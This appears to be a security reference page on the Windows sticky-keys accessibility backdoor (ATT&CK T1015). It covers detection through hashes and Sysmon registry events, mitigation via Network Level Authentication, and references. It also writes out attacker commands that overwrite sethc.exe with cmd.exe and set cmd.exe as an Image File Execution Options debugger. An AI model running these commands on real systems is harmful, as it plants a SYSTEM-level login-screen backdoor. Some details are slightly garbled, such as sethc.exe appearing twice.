# T1015 - Accessibility Features

## Attributes

**Tactic**: Persistence, Privilege escalation
**Effective Permissions**: System
**Data Sources**: Windows Registry, File monitoring, Process monitoring

## Description

The attacker will try to replace an accessibility executable such as **C:\Windows\System32\sethc.exe** or **C:\Windows\System32\sethc.exe** with **cmd.exe**. Once the accessibility executable has been replaced the attacker can now bring command prompt up regardless of user access by pressing **shift 5 times** or pressing **Win + U**.

## Tools to Perform Attack

Windows command line using the **move** or **copy** command.

### Examples

```shell
move /Y %windir%\System32\cmd.exe %windir%\System32\sethc.exe
copy /y %windir%\System32\cmd.exe %windir%\System32\sethc.exe
```

An attacker might also attach cmd.exe as a debugger to these tools by using the windows registry.

```shell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```

### Other Accessibility Executables

|File|Description|
|-|-|
|**C:\Windows\System32\osk.exe**| On-Screen Keyboard |
|**C:\Windows\System32\Magnify.exe**| Magnifier |
|**C:\Windows\System32\Narrator.exe**| Narrator |
|**C:\Windows\System32\DisplaySwitch.exe**| Display Switcher |
|**C:\Windows\System32\AtBroker.exe**| App switcher |

## Detection

Compare the hashes of the accessibility executables. A powershell script is available in references.

Monitor the registry at
> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options

### Example

> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe

To search for this on kibana you would use the sysmon event ID 12/13/14 (Registry Events), with the context 
`HKLM\SOFTWARE\Microsoft\Windows\Windows NT\CurrentVersion\Image File Execution Options`

### Event IDs

Sysmon - Event ID 12 - Registry object added or deleted (rule: RegistryEvent)
`TargetObject: HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services`
Sysmon - Event ID 1 - Process Create (rule: ProcessCreate)
`ParentImage: utilman.exe /debug`

## Mitigation

- Ensure that Network Level Authentication is enabled so that RDP users can't access the login screen without being logged in.

## References

- [Mitre T1015](https://attack.mitre.org/techniques/T1015/)
- **Atomic Red Team Article**
  - [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1015/T1015.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1015/T1015.md)
- **Sticky-Keys scanner powershell script**
  - [https://github.com/TrullJ/sticky-keys-scanner/blob/master/TestFor-StickyKey.ps1](https://github.com/TrullJ/sticky-keys-scanner/blob/master/TestFor-StickyKey.ps1)
- **How to configure Network Level Authentication for RDP**
  - [https://www.darkoperator.com/blog/2012/3/17/configuring-network-level-authentication-for-rdp.html](https://www.darkoperator.com/blog/2012/3/17/configuring-network-level-authentication-for-rdp.html)
